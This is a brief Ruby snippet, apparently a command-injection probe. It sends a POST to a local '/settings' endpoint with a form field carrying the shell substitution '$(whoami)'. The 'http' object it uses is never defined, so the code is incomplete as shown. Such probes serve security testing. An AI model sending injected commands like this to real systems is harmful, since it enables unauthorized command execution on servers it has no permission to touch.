require 'net/http'
request = Net::HTTP::Post.new(URI('http://127.0.0.1/settings'))
request.body = 'account=$(whoami)'
http.request(request)
